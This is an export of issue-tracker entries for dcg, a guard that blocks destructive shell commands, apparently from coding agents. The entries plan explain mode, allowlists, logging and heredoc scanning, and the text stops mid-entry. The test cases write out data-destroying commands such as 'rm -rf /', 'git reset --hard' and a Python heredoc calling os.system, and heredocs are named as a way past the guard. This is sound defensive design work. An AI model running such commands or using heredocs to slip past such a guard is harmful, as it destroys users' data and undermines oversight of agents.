{"id":"git_safety_guard-1gt","title":"Epic: Explainability, UX, and Operations","description":"# Epic: Explainability, UX, and Operations\n\n## Why this epic exists\n\nEven a correct guard will occasionally block or warn. When that happens, the tool must:\n\n- Explain *what* matched (pack + pattern), *where* it matched (execution context), and *why* it’s considered dangerous.\n- Provide clear, low-friction escape hatches (manual run guidance, allowlisting, warn/log-only modes).\n- Produce logs that allow teams to diagnose false positives and tune configuration.\n\nWithout this, users experience “annoying and disruptive” interruptions and will disable the guard.\n\n## Goals\n\n1. **Explainability:** a human can quickly understand the decision without reading source.\n2. **Ergonomics for coding agents:** easy to test, easy to allowlist, easy to see what would be blocked.\n3. **Operational knobs:** block vs warn vs log-only; per-pack enable/disable; per-pattern allowlist.\n4. **High-quality logging:** deterministic, machine-parseable (optional), and privacy-conscious.\n\n## Non-goals\n\n- Building a full policy language; keep configuration understandable.\n\n## Acceptance criteria (epic-level)\n\n- A user can run something like `dcg test --explain \"...\"` and see:\n  - normalized command\n  - execution contexts detected\n  - packs considered/skipped (keyword gating)\n  - the first blocking match with `pack_id` + `pattern_name`\n- The deny message includes a stable identifier that can be allowlisted without copying regexes.\n- Logging can be enabled to collect blocked events with timestamps, pack/pattern IDs, and command (with optional redaction).\n","status":"open","priority":2,"issue_type":"epic","created_at":"2026-01-07T19:57:39.637876513-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:57:39.637876513-05:00"}
{"id":"git_safety_guard-1gt.1","title":"Add dcg test --explain decision trace","description":"## Objective\n\nProvide an ergonomic way to debug why a command is allowed/blocked.\n\n## Background\n\nWithout an explain mode, users experiencing false positives (or surprising allows) must read source code to understand:\n\n- which packs were enabled\n- which packs were considered vs skipped\n- which pattern matched\n- whether a match was in an executable context or ignored as data\n\nThis leads to distrust and disabling the guard.\n\n## Proposed UX\n\nAdd a flag or subcommand:\n\n- `dcg test --explain \"\u003ccmd\u003e\"`\n  - prints a structured, human-readable trace\n\nTrace should include:\n\n1. Raw command\n2. Normalized command (path stripping, etc.)\n3. Execution contexts detected (once implemented)\n4. Enabled packs (expanded)\n5. Keyword gating results (which packs were skipped)\n6. First blocking match:\n   - `pack_id`\n   - `pattern_name`\n   - reason\n\nOptional:\n\n- `--json` output for machine parsing\n\n## Dependencies\n\n- Deterministic `pack_id` + `pattern_name` in `CheckResult`\n- Shared evaluator used by both hook and CLI\n\n## Acceptance criteria\n\n- For a blocked command, `--explain` shows the exact pack/pattern.\n- For an allowed command containing dangerous substrings in doc contexts, `--explain` shows it was classified as data context.\n- Output is stable and suitable for issue reports.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:04:20.427652456-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:04:38.986675732-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.1","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T20:04:20.428791912-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T20:05:37.096250877-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:05:42.129983029-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T20:05:47.162937778-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2","title":"Allowlist by (pack_id, pattern_name) instead of raw regex","description":"## Objective\n\nMake allowlisting safer and more ergonomic by allowing users to reference stable rule identifiers instead of writing regex.\n\n## Background\n\nCurrent config allows `overrides.allow` as raw regex strings. This is:\n\n- easy to misuse (overly broad allow regex)\n- hard to share across teams\n- unstable if patterns change\n\nOnce we have deterministic `pack_id` + `pattern_name`, we can allowlist specific rules precisely.\n\n## Proposed config shape (conceptual)\n\n```toml\n[overrides]\n# Existing (raw regex)\nallow = [\"...\"]\n\n# New (rule-based)\nallow_rules = [\n  { pack = \"containers.docker\", pattern = \"system-prune\", when = \"CI=true\" },\n]\n```\n\nOptional extensions:\n\n- allow by pack only (dangerous; likely disallow)\n- allow by context (e.g., allow in /tmp only)\n\n## Behavioral requirements\n\n- Allowlisting a rule should bypass the deny **only for that exact pack/pattern**, not globally.\n- Explain mode should show when a rule was allowlisted.\n\n## Acceptance criteria\n\n- A user can allowlist a single named rule without using regex.\n- Unit tests confirm allowlisting does not accidentally allow unrelated dangerous commands.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:04:52.747995072-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:04:52.747995072-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.2","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T20:04:52.749139728-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2","depends_on_id":"git_safety_guard-99e.2.2","type":"blocks","created_at":"2026-01-07T20:05:52.198404888-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:05:57.230809781-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.3","title":"Add decision modes: block vs warn vs log-only","description":"## Objective\n\nReduce disruption by allowing less-confident detections to warn or log instead of hard-blocking, while keeping high-confidence matches as hard blocks.\n\n## Background\n\nSome detections are extremely high confidence (e.g., `rm -rf /`, `git reset --hard`). Others are context-dependent or susceptible to false positives.\n\nA single binary mode (always deny) can be overly disruptive, especially when expanding into heredoc scanning and AST-based heuristics.\n\n## Proposed behavior\n\nAdd a policy layer that can choose between:\n\n- **deny** (current behavior): block command\n- **warn**: print warning to stderr and/or log, but allow command (no JSON deny)\n- **log-only**: silent allow, but log event for later review\n\nPolicy should be configurable:\n\n- global default (e.g., deny)\n- per-pack override\n- per-pattern override\n\n## Safety constraints\n\n- Default should remain deny for known-catastrophic patterns.\n- Warn/log-only must never apply to the most dangerous patterns unless the user explicitly configures it.\n\n## Acceptance criteria\n\n- Config supports selecting mode per pack/pattern.\n- Output is correct per mode:\n  - deny: stderr warning + stdout JSON deny\n  - warn: stderr warning, no stdout\n  - log-only: optional log entry, no stderr/stdout\n- Tests cover all three modes.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:05:08.791980925-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:05:08.791980925-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.3","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T20:05:08.793291122-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.3","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:06:02.265838837-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.4","title":"Structured logging for allow/deny decisions (optional redaction)","description":"## Objective\n\nImprove operational visibility without compromising privacy by offering structured logs for decisions.\n\n## Background\n\n`dcg` already supports a simple log file for blocked commands. As we add more sophisticated analysis (execution context, heredocs, AST), we need logs that can support:\n\n- diagnosing false positives\n- tuning config\n- measuring performance impact\n\n## Proposed logging fields\n\nAt minimum (on deny/warn/log-only events):\n\n- timestamp\n- mode (deny/warn/log-only)\n- raw command (optionally redacted)\n- normalized command\n- pack_id\n- pattern_name\n- reason\n- execution context summary (if available)\n- elapsed time (optional)\n\n## Redaction strategy\n\n- Provide a config option to redact arguments beyond a threshold or redact quoted strings.\n- Default behavior should be conservative (log only for deny events).\n\n## Acceptance criteria\n\n- Logs are well-formed and append-only.\n- A `--json` log format exists (optional).\n- Unit tests verify logging output format.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:05:23.438761061-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:05:23.438761061-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.4","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T20:05:23.440080967-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.4","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:06:07.298637722-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.4","depends_on_id":"git_safety_guard-tlog","type":"relates-to","created_at":"2026-01-07T20:11:15.440752673-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-26f","title":"Define TypeScript destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous TypeScript constructs within heredoc bodies.\n\n## Why This Matters\n\nTypeScript heredocs (ts-node, tsx, npx ts-node) share JavaScript's risks plus:\n1. Type erasure can hide dangerous operations behind clean interfaces\n2. Decorators and metaprogramming can obscure behavior\n3. Many TypeScript users assume type safety means runtime safety (it doesn't)\n\n## Pattern Categories to Define\n\n### All JavaScript Patterns (Inherited)\nAll patterns from the JavaScript task apply here since TypeScript compiles to JavaScript.\n\n### TypeScript-Specific Patterns\n- any type casts that hide dangerous operations\n- Type assertions (as unknown as DangerousType)\n- @ts-ignore comments preceding dangerous code\n- Non-null assertions (!) on potentially null file handles\n\n### Decorator Abuse\n- Decorators that execute arbitrary code\n- Metadata reflection for dynamic execution\n- Class decorator patterns that modify behavior\n\n### Module System\n- Triple-slash directives loading external code\n- Type-only imports that get erased (import type)\n- Namespace merging that hides implementations\n\n## Implementation Notes\n\nTypeScript parsing requires tree-sitter-typescript which handles:\n- Generic type syntax\n- Type annotations\n- Decorators\n- JSX/TSX syntax variants\n\nConsider whether to parse TypeScript directly or check the JavaScript output.\n\n## Test Cases\n\nTest TypeScript-specific constructs:\n- Type assertions around dangerous calls\n- Decorator execution order\n- Generic type inference edge cases\n- Module augmentation\n\n## Dependencies\n\n- JavaScript patterns (shared base)\n- Pattern library structure design\n- ast-grep invocation layer\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:37:17.541114003-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:37:26.449207203-05:00","dependencies":[{"issue_id":"git_safety_guard-26f","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:37:34.25492655-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-26f","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:37:34.273731104-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-26f","depends_on_id":"git_safety_guard-mcf","type":"blocks","created_at":"2026-01-07T18:37:34.292923988-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-2cu","title":"Design false positive reduction strategy for string arguments","description":"## Objective\n\nDesign and implement strategies to dramatically reduce false positives in command blocking, especially for documentation and string arguments.\n\n## The Core Problem\n\nThe current regex-based guard suffers from context blindness. It sees:\n```\nbd create --description=\"Pattern blocks rm -rf commands\"\n```\n\nAnd matches \"rm -rf\" without understanding it's:\n1. Inside a quoted string\n2. An argument to a documentation tool\n3. NOT actually being executed\n\nThis creates severe workflow disruption when trying to document the very patterns we're blocking.\n\n## Why This Is Critical\n\nFalse positives are arguably WORSE than false negatives:\n- False negative: A dangerous command might slip through (rare, recoverable with backups)\n- False positive: Blocks legitimate work, forces workarounds, erodes trust in the tool\n- Repeated false positives lead users to disable the guard entirely\n\nThe guard must be TRUSTED to make intelligent decisions, not blindly pattern-match text.\n\n## Solution Approaches\n\n### 1. Command Structure Analysis (Primary Approach)\n\nParse the top-level command with tree-sitter-bash to understand structure:\n- Identify command name (bd, git, echo, etc.)\n- Identify argument positions (which are options vs values)\n- Identify quoting context (single, double, unquoted)\n- Only apply destructive patterns to EXECUTABLE positions\n\nExample analysis:\n```\nbd create --title=\"...\" --description=\"rm -rf pattern docs\"\n         ^command       ^option         ^string value (NOT executed)\n```\n\n### 2. Safe Command Registry\n\nMaintain a list of commands that take non-executable string arguments:\n- bd create, bd update (--description, --title)\n- git commit (-m), git tag (-m)\n- echo, printf (arguments are printed, not executed)\n- grep, rg (pattern arguments)\n\nFor these commands, don't apply destructive patterns to their string arguments.\n\n### 3. Execution Context Detection\n\nDistinguish between:\n- **Direct execution**: The string IS the command (`bash dangerous_cmd`)\n- **String literal**: The string is DATA passed to a command (`bd --desc=\"...\"`)\n- **Heredoc body**: Requires language-specific analysis (the whole point of ast-grep)\n\n### 4. Two-Phase Analysis\n\n1. **Quick structural check**: Parse command structure, identify context\n2. **Pattern matching**: Only apply patterns to executable contexts\n3. **Deep analysis**: For heredocs/complex cases, use ast-grep\n\n### 5. Confidence Scoring\n\nInstead of binary block/allow:\n- High confidence dangerous: Block immediately\n- Medium confidence: More thorough analysis\n- Low confidence (looks like documentation): Allow with optional warning\n\n## Implementation Strategy\n\n1. Add tree-sitter-bash as a dependency (if not using ast-grep CLI)\n2. Parse incoming commands to identify structure\n3. Create ExecutionContext enum: Direct, StringArg, Heredoc, PipeTarget\n4. Only apply destructive patterns when context is Direct, Heredoc, or PipeTarget\n5. For StringArg context with safe parent commands, skip pattern matching\n\n## Test Cases\n\nEssential false positive tests:\n- `bd create --description=\"This blocks rm -rf\"` → ALLOW\n- `git commit -m \"Fix rm -rf pattern matching\"` → ALLOW\n- `echo \"example: git reset --hard\"` → ALLOW\n- `grep \"rm -rf\" patterns.txt` → ALLOW\n\nEssential true positive tests (should still block):\n- `rm -rf /tmp/*` → BLOCK\n- `bash -c \"rm -rf /\"` → BLOCK\n- `python3 \u003c\u003c 'EOF'\n  import os; os.system(\"rm -rf /\")\n  EOF` → BLOCK (via heredoc analysis)\n\n## Success Criteria\n\n- Zero false positives for documentation workflows (bd, git commit -m)\n- Zero false positives for string pattern searches (grep, rg)\n- Maintain blocking of actual dangerous commands\n- Sub-5ms overhead for structural analysis\n\n## Dependencies\n\n- Heredoc detection strategy (shares parsing infrastructure)\n- May influence choice of ast-grep vs tree-sitter-rust\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:36:56.104462373-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:37:02.97601574-05:00","dependencies":[{"issue_id":"git_safety_guard-2cu","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:37:02.996636534-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2cu","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:37:03.01736459-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2cu","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:02:17.777570479-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-2d4","title":"Define Perl destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous Perl constructs within heredoc bodies.\n\n## Why This Matters\n\nPerl heredocs are a classic attack vector because:\n1. Perl is often used for system administration scripts\n2. system(), exec(), backticks are core features\n3. Perl's \"TIMTOWTDI\" philosophy means many ways to do dangerous things\n4. Perl heredocs have complex quoting semantics\n\n## Pattern Categories to Define\n\n### Shell Execution\n- system() and exec() calls\n- Backtick commands `cmd`\n- qx// operator (equivalent to backticks)\n- open() with pipe syntax (open FH, \"|cmd\" or \"cmd|\")\n- IPC::Open2, IPC::Open3\n\n### Filesystem Operations\n- unlink() for file deletion\n- rmdir() for directory removal\n- File::Path::rmtree\n- rename() and link() for file manipulation\n\n### Dangerous Built-ins\n- eval() for code execution\n- do EXPR for executing files\n- require/use with dynamic paths\n- AUTOLOAD abuse\n\n### Regular Expression Dangers\n- /e modifier (eval in regex replacement)\n- Regex denial of service patterns\n- (?{code}) embedded code in regex\n\n### Process Control\n- kill() on processes\n- fork() and wait()\n- alarm() and signal handlers\n\n### Data Handling\n- Two-argument open() (security risk)\n- Reading from tainted input\n- LWP/HTTP::Tiny for network access\n\n## Implementation Notes\n\nPerl is notoriously hard to parse correctly. Challenges include:\n- Context-dependent syntax\n- Sigils ($, @, %, *)\n- Barewords vs strings vs subroutines\n- Regular expression complexity\n- Here-doc quoting variations\n\ntree-sitter-perl exists but may have limitations for complex Perl.\n\n## Test Cases\n\nPerl-specific tests:\n- Various quoting mechanisms\n- Regex with embedded code\n- open() variants\n- Sigil interpolation\n\n## Dependencies\n\n- Pattern library structure design\n- ast-grep invocation layer\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:37:19.324205765-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:37:26.492349961-05:00","dependencies":[{"issue_id":"git_safety_guard-2d4","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:37:37.366046506-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2d4","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:37:37.385299864-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-2j3","title":"Research tree-sitter Rust bindings","description":"# Research tree-sitter Rust Bindings\n\n## Objective\nEvaluate direct tree-sitter integration as an alternative to ast-grep CLI.\n\n## Background\ntree-sitter is the underlying parsing library used by ast-grep. Using it directly could offer:\n- Lower latency (no process spawning)\n- More control over parsing\n- Smaller dependency footprint (maybe)\n\nHowever, it may require more work to implement pattern matching.\n\n## Research Areas\n\n### 1. tree-sitter Rust Crate\n- API documentation and examples\n- How to load language grammars\n- Parsing API (parse string, get AST)\n- Query API for pattern matching\n\n### 2. Language Grammar Crates\n- tree-sitter-python\n- tree-sitter-bash\n- tree-sitter-javascript\n- tree-sitter-typescript\n- tree-sitter-ruby\n- How are grammars distributed? (separate crates vs bundled)\n\n### 3. Query Language\n- S-expression query syntax\n- Captures and predicates\n- Multiple patterns in one query\n- Performance of compiled queries\n\n### 4. Build Complexity\n- Compile time impact\n- Binary size impact\n- Cross-compilation considerations\n- Grammar file generation (if needed)\n\n### 5. Comparison with ast-grep\n- Feature parity\n- Development effort\n- Maintenance burden\n- Community support\n\n## Deliverables\n- Document comparing tree-sitter direct vs ast-grep\n- Code examples for both approaches\n- Recommendation with justification\n\n## Success Criteria\n- Clear understanding of trade-offs\n- Can make informed architecture decision\n- Have working proof-of-concept for both approaches","notes":"Research completed: tree-sitter v0.26.3 available with 11M+ downloads. Language grammars: tree-sitter-bash, tree-sitter-python, tree-sitter-javascript all at ^0.23.0. Ruby available, Perl uncertain.","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:28:46.751144719-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:46:14.52717456-05:00"}
{"id":"git_safety_guard-2ta","title":"Implement two-tier detection architecture (regex + ast-grep)","description":"# Two-Tier Architecture for Heredoc Detection\n\n## Key Insight\n\nThe architecture uses a **two-tier approach** to balance performance with accuracy:\n\n1. **Tier 1**: Use fast regex for heredoc detection (the regex crate uses Aho-Corasick for static compound patterns and SIMD - extremely optimized)\n2. **Tier 2**: Once a heredoc is detected, use AST-aware parsing (ast-grep) rather than reimplementing structural analysis badly with regex\n\nThis ensures 99%+ of commands (which don't contain heredocs) pay only microseconds of overhead, while heredoc commands get proper structural analysis.\n\n## Performance Budget\n\n| Operation | Budget | Typical |\n|-----------|--------|--------|\n| Tier 1 regex check | \u003c100μs | 1-10μs |\n| Heredoc extraction | \u003c1ms | 100-500μs |\n| AST parsing | \u003c5ms | 500μs-2ms |\n| **Total (heredoc path)** | \u003c10ms | 1-5ms |\n\n## Dependencies\n\nregex = \"1.10\" for Tier 1\nast-grep-core = \"0.40\" for Tier 2","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T19:30:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:30:00-05:00","dependencies":[{"issue_id":"git_safety_guard-2ta","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:56:44.30180478-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2ta","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:56:44.343696983-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-49s","title":"Implement heredoc syntax detection (regex quick-check)","description":"# Implement Heredoc Syntax Detection (Regex Quick-Check)\n\n## Objective\nImplement a fast regex-based detector that identifies commands potentially containing heredoc content.\n\n## Background\nBefore we can scan heredoc content, we need to detect its presence. This is a two-stage approach:\n1. Quick regex check (this task) - fast, may have false positives\n2. Full extraction (separate task) - accurate, only runs if quick check triggers\n\n## Implementation Details\n\n### Quick-Check Patterns\nThe quick check should match common heredoc indicators:\n\n```rust\n// Patterns to detect heredoc presence\nstatic HEREDOC_QUICK_PATTERNS: \u0026[\u0026str] = \u0026[\n    r\"\u003c\u003c[-~]?\\s*['\\\"]?\\w+['\\\"]?\",  // \u003c\u003c EOF, \u003c\u003c- 'EOF', \u003c\u003c~ \"END\"\n    r\"\u003c\u003c\u003c\\s*['\\\"]\",                 // \u003c\u003c\u003c \"here string\"\n    r\"-c\\s+['\\\"]\",                  // python -c \"code\", bash -c 'code'\n    r\"-e\\s+['\\\"]\",                  // node -e \"code\", perl -e 'code'\n];\n```\n\n### Integration Point\nAdd to the main processing pipeline after quick-reject but before pattern matching:\n\n```rust\nfn process_command(cmd: \u0026str) -\u003e Decision {\n    // Existing quick-reject (no git/rm)\n    if quick_reject(cmd) \u0026\u0026 global_quick_reject(cmd) {\n        return Decision::Allow;\n    }\n    \n    // NEW: Check for potential heredoc content\n    if has_potential_heredoc(cmd) {\n        if let Some(reason) = scan_heredoc_content(cmd) {\n            return Decision::Deny(reason);\n        }\n    }\n    \n    // Continue with existing pattern matching...\n}\n```\n\n### Performance Requirements\n- Quick check must complete in \u003c 0.5ms\n- Should not allocate on the hot path\n- Use lazy-compiled static patterns\n\n### False Positive Tolerance\n- Quick check can have false positives (triggers full scan unnecessarily)\n- Quick check must NOT have false negatives (miss actual heredocs)\n- Full scan will handle false positives gracefully\n\n## Files to Modify\n- src/packs/mod.rs or new src/heredoc/mod.rs\n- src/main.rs (pipeline integration)\n\n## Testing\n- Test each heredoc variant is detected\n- Test non-heredoc commands don't trigger\n- Benchmark quick check performance\n\n## Dependencies\n- Design: heredoc detection strategy (git_safety_guard-o15)\n- ADR approved (git_safety_guard-5ib)\n\n## Success Criteria\n- All heredoc variants from design doc are detected\n- Quick check adds \u003c 0.5ms to non-heredoc commands\n- Zero false negatives in test suite","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:30:59.514233315-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:30:59.514233315-05:00","dependencies":[{"issue_id":"git_safety_guard-49s","depends_on_id":"git_safety_guard-5ib","type":"blocks","created_at":"2026-01-07T18:31:05.994685018-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-49s","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T18:56:44.362201361-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-49s","depends_on_id":"git_safety_guard-t1rx","type":"blocks","created_at":"2026-01-07T19:28:32.390746435-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-4o8","title":"Create documentation for heredoc detection feature","description":"## Objective\n\nCreate comprehensive documentation for the heredoc detection feature, covering user configuration, pattern authoring, and security considerations.\n\n## Documentation Deliverables\n\n### 1. User Guide Updates\n\n#### README.md Updates\n- Add heredoc scanning to feature list\n- Document new command-line options (if any)\n- Update configuration examples\n\n#### Configuration Guide\n- How to enable/disable heredoc scanning\n- Language-specific configuration\n- Performance tuning options\n- Fallback behavior settings\n\n### 2. Pattern Authoring Guide\n\nNew document: `docs/patterns.md`\n\n#### Pattern Syntax\n- tree-sitter query syntax (if using queries)\n- ast-grep pattern syntax (if using ast-grep-core)\n- Examples for each supported language\n\n#### Adding New Patterns\n- Step-by-step guide\n- Testing requirements\n- Performance considerations\n- Review checklist\n\n#### Pattern Library Reference\n- Complete list of all patterns\n- What each pattern detects\n- Known limitations\n- False positive/negative notes\n\n### 3. Security Documentation\n\nNew document: `docs/security.md`\n\n#### Threat Model\n- Attack vectors heredoc detection addresses\n- Attack vectors explicitly out of scope\n- Assumptions and limitations\n\n#### Bypass Considerations\n- Known potential bypasses\n- Why certain bypasses are accepted\n- Defense in depth recommendations\n\n#### Incident Response\n- What to do if a command is wrongly blocked\n- What to do if a dangerous command gets through\n- How to report security issues\n\n### 4. Developer Documentation\n\n#### Architecture Overview\n- Pipeline flow diagram\n- Module responsibilities\n- Data flow through heredoc analysis\n\n#### API Documentation\n- Internal Rust API documentation (rustdoc)\n- Integration points for extending\n- Error handling patterns\n\n#### Contributing Guide Updates\n- How to add new language support\n- How to add new patterns\n- Testing requirements for contributions\n\n### 5. AGENTS.md Updates\n\nUpdate the AI agent guidelines:\n- New heredoc detection capabilities\n- How to test heredoc patterns\n- False positive handling guidance\n\n## Documentation Quality Requirements\n\n- All code examples must be tested\n- All configuration examples must be valid\n- Mermaid diagrams for complex flows\n- Cross-references between related docs\n- Version numbers where relevant\n\n## Dependencies\n\n- Feature implementation complete\n- Test suite passing\n- Performance benchmarks available\n- ADR finalized\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:40:41.014282391-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:40:53.349791375-05:00","dependencies":[{"issue_id":"git_safety_guard-4o8","depends_on_id":"git_safety_guard-8wt","type":"blocks","created_at":"2026-01-07T18:40:53.36819319-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-5ib","title":"Write architecture decision document (ADR)","description":"# Write Architecture Decision Document (ADR)\n\n## Objective\nSynthesize research findings into a formal Architecture Decision Record that guides implementation.\n\n## Background\nAfter completing research on ast-grep, tree-sitter, and design tasks, we need to document the chosen approach and rationale. This ADR will be the reference for all implementation work.\n\n## ADR Structure\n\n### 1. Title\n\"ADR-001: Heredoc Scanning Architecture\"\n\n### 2. Status\nProposed -\u003e Accepted -\u003e Implemented\n\n### 3. Context\n- Problem statement (heredoc bypass attacks)\n- Constraints (performance, dependencies, maintenance)\n- Options considered\n\n### 4. Decision\n- Chosen approach (ast-grep CLI vs library vs tree-sitter direct)\n- Pattern storage format\n- Integration points with existing dcg architecture\n\n### 5. Consequences\n- Benefits of chosen approach\n- Drawbacks and mitigations\n- Future considerations\n\n### 6. Technical Details\n- Dependency changes to Cargo.toml\n- New modules and their responsibilities\n- Data flow through the system\n- Configuration schema additions\n\n## Key Decisions to Document\n\n### Integration Approach\n- CLI invocation vs library\n- Sync vs async processing\n- Caching strategy\n\n### Language Support\n- Initial language set\n- Grammar distribution\n- Extension mechanism\n\n### Pattern Format\n- Hardcoded vs external\n- File format (YAML, TOML, custom)\n- Validation approach\n\n### Performance Strategy\n- Quick-reject optimizations\n- Lazy loading\n- Timeout handling\n\n### Error Handling\n- Parse failures\n- Unknown languages\n- Pattern match errors\n\n## Deliverables\n- ADR document in docs/adr/001-heredoc-scanning.md\n- Updated AGENTS.md with implementation notes\n- Diagram showing data flow\n\n## Dependencies\n- Research: ast-grep API (git_safety_guard-b45)\n- Research: tree-sitter bindings (git_safety_guard-2j3)\n- Design: heredoc detection (git_safety_guard-o15)\n- Design: language detection (git_safety_guard-jfj)\n- Design: pattern library (git_safety_guard-6sg)\n\n## Success Criteria\n- Clear, actionable decisions documented\n- All stakeholder concerns addressed\n- Implementation can proceed without ambiguity","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:30:31.162229073-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:30:31.162229073-05:00","dependencies":[{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:30:37.437715869-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:30:37.457081439-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-o15","type":"blocks","created_at":"2026-01-07T18:30:37.477144052-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-jfj","type":"blocks","created_at":"2026-01-07T18:30:37.496865872-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:30:37.516274063-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-boy","type":"blocks","created_at":"2026-01-07T18:39:09.196463586-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-6sg","title":"Design destructive pattern library structure","description":"# Design Destructive Pattern Library Structure\n\n## Objective\nDesign the structure and organization of language-specific destructive patterns for heredoc scanning.\n\n## Background\nEach supported language has its own idioms for destructive operations. We need a well-organized pattern library that:\n- Is maintainable and extensible\n- Integrates with the existing pack system\n- Provides clear documentation for each pattern\n\n## Pattern Categories by Language\n\n### Python Patterns\n- File system: os.remove, os.unlink, shutil.rmtree, pathlib.Path.unlink\n- Process execution: os.system, subprocess.run/call/Popen\n- Database: DROP TABLE, TRUNCATE (via string in execute())\n\n### Bash Patterns\n- File deletion: rm, unlink, shred\n- Git operations: git reset, git clean, git checkout (destructive forms)\n- System: reboot, shutdown, init\n\n### JavaScript/Node Patterns\n- File system: fs.rmSync, fs.unlinkSync, fs.rmdirSync\n- Process: child_process.exec, child_process.spawn\n- Database operations in strings\n\n### Ruby Patterns\n- FileUtils.rm_rf, File.delete, Dir.rmdir\n- system(), exec(), backticks\n- Database operations\n\n### Perl Patterns\n- unlink, rmdir, rmtree\n- system(), exec(), backticks\n- Database operations\n\n## Design Considerations\n\n### 1. Pattern Specification Format\nShould patterns be:\n- Hardcoded in Rust?\n- Loaded from YAML/TOML files?\n- ast-grep rule files?\n\nTrade-offs:\n- Hardcoded: Fast, type-safe, harder to update\n- External files: 